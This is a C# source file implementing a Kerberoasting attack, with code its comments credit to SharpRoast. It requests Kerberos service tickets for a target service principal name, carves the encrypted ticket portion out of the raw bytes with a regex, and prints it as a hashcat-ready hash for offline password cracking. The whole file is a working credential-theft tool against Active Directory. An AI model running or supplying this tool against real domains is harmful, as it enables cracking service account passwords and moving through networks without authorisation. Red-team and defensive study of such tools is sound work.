using System;
using System.Text.RegularExpressions;
using System.Security.Principal;

namespace Kerberoast
{
    class Roast
    {
        // Pulled directly from SharpRoast
        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }
        // Pulled directly from SharpRoast
        public static void GetDomainSPNTicket(string tLDAP, string tSPN, System.Net.NetworkCredential cred = null)
        {
            string spn = tSPN;

            // extract the username from the target LDAP query
            Match uMatch = Regex.Match(tLDAP, "(?<User>CN=.*)", RegexOptions.IgnoreCase);
            string userDN = uMatch.Groups["User"].ToString();
            string user = userDN.Replace("CN=", "");
            user = user.Substring(0, user.IndexOf(','));
            string userName = user.ToLower();

            // extract the domain name from the target LDAP query
            Match dnMatch = Regex.Match(tLDAP, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
            string domainDN = dnMatch.Groups["Domain"].ToString();
            string domain = domainDN.Replace("DC=", "").Replace(',', '.');

            try
            {
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());

                byte[] requestBytes = ticket.GetRequest();
                string ticketHexStream = BitConverter.ToString(requestBytes).Replace("-", "");

                // janky regex to try to find the part of the service ticket we want
                Match match = Regex.Match(ticketHexStream, @"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)", RegexOptions.IgnoreCase);

                if (match.Success)
                {
                    // usually 23
                    byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(), 16);

                    int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                    string dataToEnd = match.Groups["DataToEnd"].ToString();
                    string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);

                    if (match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) != "A482")
                    {
                        Console.WriteLine(" [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq.\r\n", spn);

                        bool header = false;
                        foreach (string line in Split(ticketHexStream, 80))
                        {
                            if (!header)
                            {
                                Console.WriteLine("TicketHexStream        : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                         {0}", line);
                            }
                            header = true;
                        }
                        Console.WriteLine();
                    }
                    else
                    {
                        // output to hashcat format
                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                        // Print no wrap
                        Console.WriteLine(hash);

                        //foreach (string line in Split(hash, 80))
                        //{
                            //Console.WriteLine("                         {0}", line);
                        //}
                        Console.WriteLine();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }
    }
}